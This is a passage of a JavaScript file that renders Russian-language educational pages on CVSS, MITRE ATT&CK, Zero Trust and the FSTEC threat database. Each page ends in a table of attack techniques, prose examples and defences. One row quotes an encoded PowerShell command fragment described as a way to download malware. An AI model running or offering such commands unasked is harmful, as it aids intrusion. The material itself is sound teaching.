            <li><strong>Коммуникация:</strong> CVSS упрощает обмен информацией о критичности уязвимостей между командами и вендорами.</li>
          </ul>

          <h2>История CVSS</h2>
          <p>CVSS был впервые представлен в 2005 году организацией FIRST (Forum of Incident Response and Security Teams). Первая версия (CVSS v1) была заменена на CVSS v2 в 2007 году, а в 2015 году вышла текущая версия — CVSS v3. В 2019 году была представлена версия CVSS v3.1, которая уточнила некоторые метрики. CVSS широко используется в базах данных, таких как NVD, и интегрируется с CVE для оценки уязвимостей.</p>

          <h2>Как используется CVSS?</h2>
          <p>CVSS применяется в различных аспектах кибербезопасности:</p>
          <ul>
            <li><strong>Оценка уязвимостей:</strong> CVSS используется для оценки критичности уязвимостей в базах данных, таких как NVD (например, <code>CVE-2017-0144</code> с CVSS 9.3).</li>
            <li><strong>Управление рисками:</strong> Организации используют CVSS для приоритизации уязвимостей на основе их оценок (например, уязвимости с CVSS 9.0+ устраняются в первую очередь).</li>
            <li><strong>Анализ угроз:</strong> CVSS помогает понять, насколько легко уязвимость может быть использована в атаке (например, высокая оценка Exploitability для <code>CVE-2014-0160</code>).</li>
            <li><strong>Отчётность:</strong> CVSS-оценки включаются в отчёты об уязвимостях для информирования заинтересованных сторон (например, отчёт для руководства с указанием CVSS 8.8 для <code>CVE-2019-0708</code>).</li>
            <li><strong>Интеграция:</strong> CVSS используется вместе с CVE и MITRE ATT&CK для комплексного анализа рисков (например, связка <code>CVE-2017-0144</code> с T1190).</li>
            <li><strong>Планирование патчей:</strong> CVSS помогает определить, какие уязвимости требуют немедленного патчинга (например, <code>CVE-2014-0160</code> с CVSS 7.5 требует срочного обновления OpenSSL).</li>
            <li><strong>Мониторинг:</strong> CVSS используется в системах мониторинга для автоматической классификации новых уязвимостей (например, SIEM-системы, такие как Splunk, могут уведомлять о новых CVE с CVSS 7+).</li>
          </ul>

          <h2>Как CVSS помогает в управлении уязвимостями?</h2>
          <p>CVSS предоставляет мощный инструмент для управления уязвимостями, помогая организациям в следующих аспектах:</p>
          <ul>
            <li><strong>Приоритизация задач:</strong> CVSS позволяет сосредоточиться на уязвимостях с наивысшей оценкой (например, уязвимость с CVSS 9.3, такая как EternalBlue, устраняется в первую очередь).</li>
            <li><strong>Оценка воздействия:</strong> CVSS учитывает такие факторы, как конфиденциальность, целостность и доступность, что помогает понять, насколько серьёзны последствия (например, Heartbleed с CVSS 7.5 угрожает утечкой данных).</li>
            <li><strong>Контекстная оценка:</strong> Средовые метрики CVSS позволяют адаптировать оценку к конкретной среде (например, уязвимость BlueKeep с CVSS 8.8 может быть менее критичной, если уязвимые системы изолированы).</li>
            <li><strong>Эффективное распределение ресурсов:</strong> CVSS помогает направить ресурсы на устранение наиболее опасных уязвимостей, минимизируя затраты (например, фокус на уязвимостях с высоким Exploitability Score).</li>
            <li><strong>Прогнозирование атак:</strong> Высокие CVSS-оценки, особенно с учётом Temporal метрик (наличие эксплойта), помогают предсказать вероятность атаки (например, EternalBlue с публичным эксплойтом).</li>
            <li><strong>Улучшение коммуникации:</strong> CVSS предоставляет числовую оценку, которая понятна всем сторонам — от технических специалистов до руководства (например, CVSS 8.8 для BlueKeep ясно указывает на высокую угрозу).</li>
          </ul>

          <h2>Преимущества CVSS</h2>
          <p>Использование CVSS приносит следующие преимущества:</p>
          <ul>
            <li><strong>Простота:</strong> CVSS предоставляет числовую оценку, которая легко интерпретируется (0–10).</li>
            <li><strong>Гибкость:</strong> CVSS учитывает как базовые характеристики уязвимости, так и её контекст в конкретной среде.</li>
            <li><strong>Стандартизация:</strong> CVSS признан мировым стандартом и используется вендорами, исследователями и организациями.</li>
            <li><strong>Интеграция:</strong> CVSS интегрируется с CVE, NVD и другими системами для более глубокого анализа.</li>
            <li><strong>Автоматизация:</strong> CVSS-оценки используются в инструментах для автоматической приоритизации уязвимостей.</li>
          </ul>

          <h2>Области применения</h2>
          <p>CVSS используется в различных сценариях:</p>
          <ul>
            <li><strong>Управление уязвимостями:</strong> Приоритизация уязвимостей на основе их CVSS-оценок.</li>
            <li><strong>Анализ рисков:</strong> Оценка потенциального воздействия уязвимостей на системы.</li>
            <li><strong>Патч-менеджмент:</strong> Определение, какие уязвимости требуют немедленного устранения.</li>
            <li><strong>Отчётность:</strong> Включение CVSS-оценок в отчёты для информирования руководства.</li>
            <li><strong>Исследования:</strong> Исследователи используют CVSS для анализа новых уязвимостей.</li>
          </ul>

          <p>Ниже представлена таблица с примерами уязвимостей, оценённых по CVSS, их описанием, примерами применения и рекомендациями по защите.</p>
        </div>

        <div class="osi-table-container">
          <table class="osi-table">
            <thead>
              <tr>
                <th>Название уязвимости</th>
                <th>Описание</th>
                <th>Пример применения</th>
                <th>Рекомендации по защите</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><strong>EternalBlue (<code>CVE-2017-0144</code>)</strong></td>
                <td>Уязвимость в протоколе SMBv1 Windows с CVSS 9.3, позволяющая удалённое выполнение кода и широко используемая в атаках, таких как WannaCry.</td>
                <td>Злоумышленник отправляет вредоносный пакет через SMB, получая полный контроль над системой Windows.</td>
                <td>Установить патч MS17-010 от Microsoft, отключить SMBv1, настроить брандмауэр для блокировки порта 445.</td>
              </tr>
              <tr>
                <td><strong>Heartbleed (<code>CVE-2014-0160</code>)</strong></td>
                <td>Уязвимость в OpenSSL с CVSS 7.5, позволяющая утечку конфиденциальных данных, таких как ключи шифрования, из памяти сервера.</td>
                <td>Злоумышленник отправляет специально сформированный запрос, извлекая до 64 КБ данных из памяти сервера.</td>
                <td>Обновить OpenSSL до версии 1.0.1g, заменить скомпрометированные ключи, включить мониторинг HTTPS-трафика.</td>
              </tr>
              <tr>
                <td><strong>BlueKeep (<code>CVE-2019-0708</code>)</strong></td>
                <td>Уязвимость в службе RDP Windows с CVSS 8.8, позволяющая удалённое выполнение кода без аутентификации.</td>
                <td>Злоумышленник подключается к уязвимому RDP-серверу и выполняет произвольный код с правами SYSTEM.</td>
                <td>Установить патч от Microsoft, отключить RDP, если он не используется, ограничить доступ к порту 3389.</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    `;

    document.querySelector('.back-btn').addEventListener('click', () => {
      loadVulnerabilitiesContent(container);
    });
}

function loadMitreAttckContent(container) {
    container.innerHTML = `
      <div class="vulnerabilities-container">
        <button class="back-btn">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
          </svg>
          Назад
        </button>
        <h1>MITRE ATT&CK</h1>
        <div class="mitre-attck-description">
          <p><strong>MITRE ATT&CK</strong> (Adversarial Tactics, Techniques, and Common Knowledge) — это база знаний о тактиках, техниках и процедурах (TTP), используемых злоумышленниками в кибератаках. Она структурирована в виде матрицы, которая описывает этапы атаки (например, Initial Access, Execution, Persistence) и конкретные техники, применяемые на каждом этапе.</p>

          <h2>Зачем нужен MITRE ATT&CK?</h2>
          <p>MITRE ATT&CK помогает организациям и специалистам по безопасности в следующих аспектах:</p>
          <ul>
            <li><strong>Понимание атак:</strong> ATT&CK предоставляет детализированное описание тактик и техник, используемых злоумышленниками, что помогает понять их поведение.</li>
            <li><strong>Моделирование угроз:</strong> ATT&CK используется для создания сценариев атак и моделирования угроз, чтобы подготовиться к возможным инцидентам.</li>
            <li><strong>Обнаружение и реагирование:</strong> ATT&CK помогает настроить системы обнаружения (SIEM) и реагирования на инциденты, фокусируясь на конкретных техниках.</li>
            <li><strong>Обучение:</strong> ATT&CK используется для обучения специалистов по безопасности, показывая, как злоумышленники действуют на разных этапах атаки.</li>
            <li><strong>Стандартизация:</strong> ATT&CK предоставляет единый язык для описания атак, что упрощает коммуникацию между командами и вендорами.</li>
          </ul>

          <h2>История MITRE ATT&CK</h2>
          <p>MITRE ATT&CK был впервые представлен в 2013 году как часть проекта FMX (Fort Meade Experiment) в MITRE. Изначально он был создан для анализа поведения злоумышленников и улучшения обнаружения атак. В 2015 году MITRE опубликовала первую публичную версию ATT&CK, которая включала матрицу для Enterprise-систем. Позже были добавлены матрицы для Mobile и ICS (Industrial Control Systems). Сегодня ATT&CK регулярно обновляется и используется по всему миру как стандарт для анализа киберугроз.</p>

          <h2>Как используется MITRE ATT&CK?</h2>
          <p>MITRE ATT&CK применяется в различных аспектах кибербезопасности:</p>
          <ul>
            <li><strong>Моделирование угроз:</strong> ATT&CK используется для создания сценариев атак (например, как злоумышленник может использовать технику T1190 для начального доступа).</li>
            <li><strong>Настройка обнаружения:</strong> SIEM-системы, такие как Splunk, настраиваются для обнаружения техник ATT&CK (например, T1059 — Command and Scripting Interpreter).</li>
            <li><strong>Реагирование на инциденты:</strong> ATT&CK помогает определить, какие техники использовались в атаке, и разработать план реагирования (например, анализ логов для выявления T1078).</li>
            <li><strong>Пентестинг:</strong> Пентестеры используют ATT&CK для имитации реальных атак (например, применение T1021 для бокового перемещения).</li>
            <li><strong>Анализ уязвимостей:</strong> ATT&CK связывается с CVE для понимания, как уязвимости могут быть использованы в атаках (например, <code>CVE-2021-44228</code> с T1190).</li>
            <li><strong>Обучение:</strong> ATT&CK используется в тренингах для демонстрации тактик и техник, таких как T1082 (System Information Discovery).</li>
          </ul>

          <h2>Как MITRE ATT&CK помогает в управлении угрозами?</h2>
          <p>MITRE ATT&CK предоставляет следующие возможности для управления киберугрозами:</p>
          <ul>
            <li><strong>Проактивная защита:</strong> ATT&CK позволяет подготовиться к атакам, зная, какие техники могут быть использованы (например, защита от T1190 с помощью WAF).</li>
            <li><strong>Улучшение обнаружения:</strong> ATT&CK помогает настроить правила обнаружения в SIEM для конкретных техник (например, обнаружение T1059 через анализ командных строк).</li>
            <li><strong>Анализ инцидентов:</strong> ATT&CK позволяет понять, на каком этапе атаки находится злоумышленник (например, T1021 указывает на боковое перемещение).</li>
            <li><strong>Оптимизация ресурсов:</strong> ATT&CK помогает сосредоточиться на наиболее вероятных техниках, используемых в вашей отрасли (например, T1078 в финансовом секторе).</li>
            <li><strong>Связь с реальными атаками:</strong> ATT&CK позволяет сопоставить атаки с известными группами (например, APT29 использует T1082 для разведки).</li>
          </ul>

          <h2>Связь MITRE ATT&CK с другими системами</h2>
          <p>MITRE ATT&CK интегрируется с другими стандартами и системами:</p>
          <ul>
            <li><strong>CVE:</strong> ATT&CK связывает уязвимости с техниками (например, <code>CVE-2021-44228</code> с T1190 — Exploit Public-Facing Application).</li>
            <li><strong>CVSS:</strong> ATT&CK используется вместе с CVSS для оценки риска техник, связанных с уязвимостями (например, T1190 с CVSS 9.8).</li>
            <li><strong>CWE:</strong> ATT&CK помогает понять, какие слабости (CWE) могут быть использованы в техниках (например, T1059 связан с <code>CWE-77</code>).</li>
            <li><strong>NIST 800-53:</strong> ATT&CK используется для реализации контролей безопасности, таких как мониторинг и реагирование.</li>
            <li><strong>SIEM и EDR:</strong> ATT&CK интегрируется с системами, такими как Splunk или CrowdStrike, для обнаружения и анализа техник.</li>
          </ul>

          <h2>Преимущества MITRE ATT&CK</h2>
          <p>Использование MITRE ATT&CK приносит следующие преимущества:</p>
          <ul>
            <li><strong>Детализация:</strong> ATT&CK предоставляет подробное описание техник, что помогает понять поведение злоумышленников.</li>
            <li><strong>Универсальность:</strong> ATT&CK охватывает атаки на Enterprise, Mobile и ICS, что делает его применимым в разных средах.</li>
            <li><strong>Доступность:</strong> ATT&CK является бесплатным и открытым ресурсом, доступным для всех.</li>
            <li><strong>Интеграция:</strong> ATT&CK легко интегрируется с другими системами, такими как CVE, CVSS и SIEM.</li>
            <li><strong>Практичность:</strong> ATT&CK ориентирован на реальные атаки, что делает его полезным для практического применения.</li>
          </ul>

          <h2>Области применения</h2>
          <p>MITRE ATT&CK используется в различных сценариях:</p>
          <ul>
            <li><strong>Моделирование угроз:</strong> Создание сценариев атак для подготовки к инцидентам.</li>
            <li><strong>Обнаружение и реагирование:</strong> Настройка систем мониторинга и реагирования на инциденты.</li>
            <li><strong>Пентестинг:</strong> Имитация атак для проверки защищённости систем.</li>
            <li><strong>Анализ уязвимостей:</strong> Связь техник с уязвимостями для понимания их последствий.</li>
            <li><strong>Обучение:</strong> Проведение тренингов для специалистов по безопасности.</li>
          </ul>

          <p>Ниже представлена таблица с примерами техник из MITRE ATT&CK, их описанием, примерами применения и рекомендациями по защите.</p>
        </div>

        <div class="osi-table-container">
          <table class="osi-table">
            <thead>
              <tr>
                <th>Название техники</th>
                <th>Описание</th>
                <th>Пример применения</th>
                <th>Рекомендации по защите</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><strong>Exploit Public-Facing Application (<code>T1190</code>)</strong></td>
                <td>Использование уязвимостей в публичных приложениях для получения начального доступа (Initial Access).</td>
                <td>Злоумышленник использует <code>CVE-2021-44228</code> (Log4Shell) для выполнения кода через публичный веб-сервер.</td>
                <td>Настроить WAF для фильтрации вредоносных запросов, регулярно обновлять ПО, проводить пентесты.</td>
              </tr>
              <tr>
                <td><strong>Command and Scripting Interpreter (<code>T1059</code>)</strong></td>
                <td>Использование командных оболочек (например, PowerShell) для выполнения вредоносных команд (Execution).</td>
                <td>Злоумышленник выполняет <code>powershell.exe -EncodedCommand</code> для загрузки вредоносного ПО.</td>
                <td>Ограничить выполнение PowerShell для непривилегированных пользователей, мониторить командные строки через SIEM.</td>
              </tr>
              <tr>
                <td><strong>Valid Accounts (<code>T1078</code>)</strong></td>
                <td>Использование украденных учётных данных для доступа к системам (Persistence, Privilege Escalation).</td>
                <td>Злоумышленник использует украденные учётные данные администратора для входа в систему.</td>
                <td>Внедрить MFA, мониторить аномальную активность учётных записей, использовать RBAC.</td>
              </tr>
              <tr>
                <td><strong>Remote Desktop Protocol (<code>T1021</code>)</strong></td>
                <td>Использование RDP для бокового перемещения внутри сети (Lateral Movement).</td>
                <td>Злоумышленник подключается к серверу через RDP, используя украденные учётные данные.</td>
                <td>Ограничить доступ к RDP (порт 3389), использовать VPN, включить Network Level Authentication (NLA).</td>
              </tr>
              <tr>
                <td><strong>System Information Discovery (<code>T1082</code>)</strong></td>
                <td>Сбор информации о системе для дальнейшей атаки (Discovery).</td>
                <td>Злоумышленник выполняет <code>systeminfo</code> для получения данных о версии ОС и патчах.</td>
                <td>Ограничить доступ к системным командам, мониторить подозрительные вызовы через EDR.</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    `;

    document.querySelector('.back-btn').addEventListener('click', () => {
      loadVulnerabilitiesContent(container);
    });
}

function loadZtaContent(container) {
    container.innerHTML = `
      <div class="vulnerabilities-container">
        <button class="back-btn">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
          </svg>
          Назад
        </button>
        <h1>Zero Trust Architecture (ZTA)</h1>
        <div class="zta-description">
          <p><strong>Zero Trust Architecture (ZTA)</strong> — это подход к кибербезопасности, основанный на принципе "никогда не доверяй, всегда проверяй". ZTA предполагает, что ни один пользователь, устройство или сеть не являются доверенными по умолчанию, даже если они находятся внутри периметра организации.</p>

          <h2>Зачем нужна ZTA?</h2>
          <p>ZTA необходима для защиты современных ИТ-сред, где традиционные периметры безопасности уже неэффективны:</p>
          <ul>
            <li><strong>Защита от внутренних угроз:</strong> ZTA предотвращает атаки от инсайдеров или скомпрометированных учётных записей.</li>
            <li><strong>Безопасность удалённого доступа:</strong> ZTA обеспечивает безопасный доступ для удалённых сотрудников и устройств.</li>
            <li><strong>Снижение риска утечек данных:</strong> ZTA минимизирует доступ к данным, предоставляя его только по необходимости.</li>
            <li><strong>Адаптация к облачным средам:</strong> ZTA подходит для защиты облачных приложений и гибридных инфраструктур.</li>
            <li><strong>Соответствие требованиям:</strong> ZTA помогает соответствовать стандартам, таким как GDPR, HIPAA и NIST 800-207.</li>
          </ul>

          <h2>История ZTA</h2>
          <p>Концепция Zero Trust была впервые предложена в 2010 году аналитиком Forrester Research Джоном Киндервагом. Он утверждал, что традиционные модели безопасности, основанные на периметре, устарели из-за роста облачных технологий и удалённой работы. В 2018 году Google опубликовала свою реализацию ZTA под названием BeyondCorp, что популяризировало подход. В 2020 году NIST выпустил стандарт NIST 800-207, который формализовал принципы ZTA. Сегодня ZTA активно внедряется в организациях по всему миру.</p>

          <h2>Как используется ZTA?</h2>
          <p>ZTA применяется в различных аспектах кибербезопасности:</p>
          <ul>
            <li><strong>Аутентификация и авторизация:</strong> ZTA требует строгой проверки пользователей и устройств перед предоставлением доступа (например, MFA).</li>
            <li><strong>Мониторинг и аналитика:</strong> ZTA использует SIEM и EDR для постоянного мониторинга активности (например, Splunk для анализа поведения).</li>
            <li><strong>Сегментация сети:</strong> ZTA применяет микросегментацию для ограничения бокового перемещения (например, с помощью VMware NSX).</li>
            <li><strong>Шифрование данных:</strong> ZTA обеспечивает шифрование данных в покое и в движении (например, TLS для передачи данных).</li>
            <li><strong>Управление доступом:</strong> ZTA использует RBAC и ABAC для предоставления минимально необходимых прав (например, доступ только к нужным API).</li>
          </ul>

          <h2>Как ZTA помогает в управлении угрозами?</h2>
          <p>ZTA предоставляет следующие возможности для управления киберугрозами:</p>
          <ul>
            <li><strong>Предотвращение бокового перемещения:</strong> ZTA ограничивает доступ, что затрудняет перемещение злоумышленников внутри сети (например, предотвращение T1021).</li>
            <li><strong>Обнаружение аномалий:</strong> ZTA использует аналитику поведения для выявления подозрительной активности (например, обнаружение T1078 через UEBA).</li>
            <li><strong>Минимизация ущерба:</strong> ZTA ограничивает доступ к данным, что снижает ущерб от утечек (например, защита от T1003).</li>
            <li><strong>Безопасность удалённой работы:</strong> ZTA обеспечивает безопасный доступ для удалённых сотрудников через VPN и MFA.</li>
            <li><strong>Соответствие стандартам:</strong> ZTA помогает внедрить контроли, требуемые NIST 800-207, такие как постоянная проверка.</li>
          </ul>

          <h2>Связь ZTA с другими системами</h2>
          <p>ZTA интегрируется с другими стандартами и системами:</p>
          <ul>
            <li><strong>MITRE ATT&CK:</strong> ZTA помогает предотвратить техники, такие как T1190, через строгую проверку доступа.</li>
            <li><strong>SIEM и EDR:</strong> ZTA использует системы, такие как Splunk и CrowdStrike, для мониторинга и анализа.</li>
            <li><strong>IAM:</strong> ZTA интегрируется с системами управления идентификацией, такими как Okta, для реализации MFA.</li>
            <li><strong>NIST 800-207:</strong> ZTA основана на принципах, описанных в NIST 800-207, таких как непрерывная проверка.</li>
            <li><strong>SDN:</strong> ZTA использует программно-определяемые сети (SDN) для микросегментации (например, Cisco ACI).</li>
          </ul>

          <h2>Преимущества ZTA</h2>
          <p>Использование ZTA приносит следующие преимущества:</p>
          <ul>
            <li><strong>Повышенная безопасность:</strong> ZTA минимизирует риски за счёт строгой проверки и ограничения доступа.</li>
            <li><strong>Гибкость:</strong> ZTA подходит для облачных, локальных и гибридных сред.</li>
            <li><strong>Снижение ущерба:</strong> ZTA ограничивает доступ, что уменьшает последствия атак.</li>
            <li><strong>Соответствие требованиям:</strong> ZTA помогает соответствовать стандартам, таким как GDPR и NIST.</li>
            <li><strong>Поддержка удалённой работы:</strong> ZTA обеспечивает безопасный доступ для распределённых команд.</li>
          </ul>

          <h2>Области применения</h2>
          <p>ZTA используется в различных сценариях:</p>
          <ul>
            <li><strong>Защита облачных сред:</strong> Обеспечение безопасности приложений в AWS, Azure и GCP.</li>
            <li><strong>Удалённый доступ:</strong> Безопасный доступ для сотрудников, работающих из дома.</li>
            <li><strong>Микросегментация:</strong> Ограничение бокового перемещения в корпоративных сетях.</li>
            <li><strong>Защита данных:</strong> Минимизация утечек данных через строгий контроль доступа.</li>
            <li><strong>Соответствие стандартам:</strong> Внедрение ZTA для выполнения требований NIST и GDPR.</li>
          </ul>

          <p>Ниже представлена таблица с примерами уязвимостей и сценариев, которые ZTA помогает предотвратить, их описанием, примерами применения и рекомендациями по защите.</p>
        </div>

        <div class="osi-table-container">
          <table class="osi-table">
            <thead>
              <tr>
                <th>Название уязвимости/сценария</th>
                <th>Описание</th>
                <th>Пример применения</th>
                <th>Рекомендации по защите с ZTA</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><strong>Credential Dumping (<code>T1003</code>)</strong></td>
                <td>Злоумышленник извлекает учётные данные из памяти системы для дальнейшего использования.</td>
                <td>Злоумышленник использует Mimikatz для извлечения паролей из памяти сервера.</td>
                <td>Внедрить MFA, ограничить доступ к системам с помощью RBAC, мониторить аномалии через UEBA.</td>
              </tr>
              <tr>
                <td><strong>Lateral Movement (<code>T1021</code>)</strong></td>
                <td>Злоумышленник перемещается внутри сети, используя украденные учётные данные.</td>
                <td>Злоумышленник использует RDP для доступа к другому серверу в сети.</td>
                <td>Применить микросегментацию, ограничить доступ к портам (например, 3389), использовать Network Level Authentication.</td>
              </tr>
              <tr>
                <td><strong>Exploitation of Remote Services (<code>T1210</code>)</strong></td>
                <td>Злоумышленник использует уязвимости в удалённых сервисах для доступа к системам.</td>
                <td>Злоумышленник эксплуатирует <code>CVE-2019-0708</code> (BlueKeep) для доступа через RDP.</td>
                <td>Ограничить доступ к удалённым сервисам, использовать VPN, проводить регулярные пентесты.</td>
              </tr>
              <tr>
                <td><strong>Phishing (<code>T1566</code>)</strong></td>
                <td>Злоумышленник отправляет фишинговые письма для кражи учётных данных.</td>
                <td>Злоумышленник отправляет письмо с вредоносной ссылкой, которая крадёт учётные данные пользователя.</td>
                <td>Внедрить MFA, обучать сотрудников распознаванию фишинга, использовать антифишинговые фильтры.</td>
              </tr>
              <tr>
                <td><strong>Data Exfiltration (<code>T1041</code>)</strong></td>
                <td>Злоумышленник извлекает конфиденциальные данные из сети.</td>
                <td>Злоумышленник отправляет данные через C2-канал после компрометации системы.</td>
                <td>Шифровать данные в движении, мониторить исходящий трафик через DLP, ограничить доступ к данным.</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    `;

    document.querySelector('.back-btn').addEventListener('click', () => {
      loadVulnerabilitiesContent(container);
    });
}

function loadBduFstecContent(container) {
    container.innerHTML = `
      <div class="vulnerabilities-container">
        <button class="back-btn">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
          </svg>
          Назад
        </button>
        <h1>БДУ ФСТЭК</h1>
        <div class="bdu-fstec-description">
          <p><strong>БДУ ФСТЭК</strong> (Банк данных угроз безопасности информации Федеральной службы по техническому и экспортному контролю) — это российская база данных, содержащая сведения об угрозах безопасности информации и уязвимостях программного обеспечения и программно-аппаратных средств. БДУ ФСТЭК создана для повышения информированности специалистов по информационной безопасности, особенно в государственных информационных системах (ГИС), объектах критической информационной инфраструктуры (КИИ) и автоматизированных системах управления (АСУ).</p>

          <h2>Зачем нужен БДУ ФСТЭК?</h2>
          <p>БДУ ФСТЭК необходим для обеспечения безопасности информационных систем по следующим причинам:</p>
          <ul>
            <li><strong>Информирование:</strong> БДУ предоставляет актуальные данные об угрозах и уязвимостях, что помогает организациям быть в курсе текущих рисков.</li>
            <li><strong>Стандартизация:</strong> БДУ предлагает единый источник данных для моделирования угроз, что упрощает разработку моделей безопасности.</li>
            <li><strong>Поддержка ГИС, КИИ и АСУ:</strong> БДУ ориентирован на системы, используемые в государственных и критически важных инфраструктурах.</li>
            <li><strong>Устранение уязвимостей:</strong> БДУ помогает разработчикам и операторам устранять уязвимости в программном обеспечении.</li>
            <li><strong>Соответствие требованиям:</strong> Использование БДУ обязательно для организаций, работающих с ГИС, КИИ и АСУ, согласно российскому законодательству.</li>
          </ul>

          <h2>История БДУ ФСТЭК</h2>
          <p>БДУ ФСТЭК был создан в 2015 году на основе приказа ФСТЭК России от 16 февраля 2015 года. Изначально база была разработана для поддержки государственных информационных систем и объектов КИИ, но позже стала доступна для всех организаций, занимающихся информационной безопасностью. Ведением базы занимается ФАУ «ГНИИИ ПТЗИ ФСТЭК России». На февраль 2025 года в БДУ содержится 222 угрозы и более 67 000 уязвимостей, и база продолжает активно обновляться.</p>

          <h2>Как используется БДУ ФСТЭК?</h2>
          <p>БДУ ФСТЭК применяется в различных аспектах кибербезопасности:</p>
          <ul>
            <li><strong>Моделирование угроз:</strong> БДУ используется для разработки моделей угроз для информационных систем (например, ИСПДн, ГИС, КИИ).</li>
            <li><strong>Анализ уязвимостей:</strong> БДУ предоставляет данные об уязвимостях, которые могут быть использованы для сканирования систем (например, с помощью ScanOVAL).</li>
            <li><strong>Устранение уязвимостей:</strong> Разработчики ПО используют БДУ для получения информации об уязвимостях и их устранения.</li>
            <li><strong>Аудит безопасности:</strong> БДУ применяется при проведении аудита для оценки актуальных угроз и уязвимостей.</li>
            <li><strong>Интеграция с другими источниками:</strong> ФСТЭК рекомендует использовать БДУ вместе с другими базами, такими как MITRE ATT&CK, CAPEC и OWASP.</li>
          </ul>

          <h2>Как БДУ ФСТЭК помогает в управлении угрозами?</h2>
          <p>БДУ ФСТЭК предоставляет следующие возможности для управления киберугрозами:</p>
          <ul>
            <li><strong>Актуальность угроз:</strong> БДУ помогает определить, какие угрозы актуальны для конкретной системы (например, угрозы для АСУ ТП).</li>
            <li><strong>Поддержка отечественного ПО:</strong> БДУ содержит уникальные данные об уязвимостях в российском ПО, которых нет в зарубежных базах.</li>
            <li><strong>Интеграция с процессами:</strong> БДУ используется для автоматизации процессов сканирования и устранения уязвимостей (например, через ScanOVAL).</li>
            <li><strong>Снижение рисков:</strong> БДУ помогает организациям минимизировать риски, предоставляя информацию о способах эксплуатации уязвимостей.</li>
            <li><strong>Соответствие требованиям:</strong> БДУ позволяет организациям соответствовать требованиям законодательства РФ в области ИБ.</li>
          </ul>

          <h2>Связь БДУ ФСТЭК с другими системами</h2>
          <p>БДУ ФСТЭК интегрируется с другими стандартами и системами:</p>
          <ul>
            <li><strong>CVE:</strong> Многие уязвимости в БДУ связаны с CVE-идентификаторами (например, <code>BDU:2020-05127</code> может быть связан с CVE).</li>
            <li><strong>CVSS:</strong> БДУ использует CVSS v2 для оценки критичности уязвимостей, хотя поддержка v3 также возможна.</li>
            <li><strong>MITRE ATT&CK:</strong> ФСТЭК рекомендует использовать ATT&CK для анализа техник, связанных с уязвимостями из БДУ.</li>
            <li><strong>NIST:</strong> БДУ может быть использован для реализации контролей NIST 800-53 в российских системах.</li>
            <li><strong>OWASP и CAPEC:</strong> БДУ дополняется данными из OWASP и CAPEC для анализа веб-уязвимостей и сценариев атак.</li>
          </ul>

          <h2>Преимущества БДУ ФСТЭК</h2>
          <p>Использование БДУ ФСТЭК приносит следующие преимущества:</p>
          <ul>
            <li><strong>Бесплатность:</strong> Доступ к БДУ бесплатный, что отличает его от многих коммерческих баз.</li>
            <li><strong>Актуальность:</strong> БДУ регулярно обновляется, включая новые уязвимости и угрозы.</li>
            <li><strong>Поддержка отечественного ПО:</strong> БДУ содержит уникальные данные об уязвимостях в российском ПО.</li>
            <li><strong>Интеграция:</strong> БДУ может использоваться вместе с другими базами, такими как CVE и MITRE ATT&CK.</li>
            <li><strong>Соответствие законодательству:</strong> БДУ помогает организациям соответствовать требованиям ФСТЭК и законодательства РФ.</li>
          </ul>

          <h2>Области применения</h2>
          <p>БДУ ФСТЭК используется в различных сценариях:</p>
          <ul>
            <li><strong>Государственные информационные системы:</strong> Разработка моделей угроз для ГИС.</li>
            <li><strong>Объекты КИИ:</strong> Анализ уязвимостей в критической инфраструктуре.</li>
            <li><strong>АСУ ТП:</strong> Обеспечение безопасности автоматизированных систем управления.</li>
            <li><strong>Разработка ПО:</strong> Устранение уязвимостей в программном обеспечении.</li>
            <li><strong>Аудит безопасности:</strong> Оценка актуальных угроз и уязвимостей в системах.</li>
          </ul>

          <p>Ниже представлена таблица с примерами уязвимостей из БДУ ФСТЭК, их описанием, примерами применения и рекомендациями по защите.</p>
        </div>

        <div class="osi-table-container">
          <table class="osi-table">
            <thead>
              <tr>
                <th>Название уязвимости</th>
                <th>Описание</th>
                <th>Пример применения</th>
                <th>Рекомендации по защите</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><strong>Cross-Site Scripting (<code>BDU:2020-05127</code>)</strong></td>
                <td>Уязвимость, связанная с ошибкой <code>CWE-79</code>, позволяющая выполнять произвольный код в браузере пользователя через веб-приложение.</td>
                <td>Злоумышленник отправляет вредоносный скрипт через форму на сайте, который выполняется в браузере жертвы.</td>
                <td>Использовать экранирование ввода, внедрить Content Security Policy (CSP), проводить аудит кода.</td>
              </tr>
              <tr>
                <td><strong>Information Disclosure (<code>BDU:2020-05128</code>)</strong></td>
                <td>Уязвимость, связанная с <code>CWE-200</code>, позволяющая получить доступ к конфиденциальным данным через специально сформированный запрос.</td>
                <td>Злоумышленник отправляет запрос, раскрывающий учётные данные в заголовках ответа сервера.</td>
                <td>Ограничить доступ к конфиденциальным данным, настроить заголовки безопасности, шифровать данные.</td>
              </tr>
              <tr>
                <td><strong>Access Control Bypass (<code>BDU:2020-05129</code>)</strong></td>
                <td>Уязвимость, связанная с <code>CWE-264</code>, позволяющая обойти ограничения доступа через специально сформированный запрос.</td>
                <td>Злоумышленник изменяет параметры запроса, получая доступ к данным другого пользователя.</td>
                <td>Внедрить строгую проверку прав доступа, использовать RBAC, проводить тестирование на проникновение.</td>
              </tr>
              <tr>
                <td><strong>Buffer Overflow (<code>BDU:2020-05130</code>)</strong></td>
                <td>Уязвимость, связанная с <code>CWE-120</code>, позволяющая выполнить произвольный код через специально сформированное сообщение RPC.</td>
                <td>Злоумышленник отправляет RPC-запрос с переполнением буфера, что приводит к выполнению кода.</td>
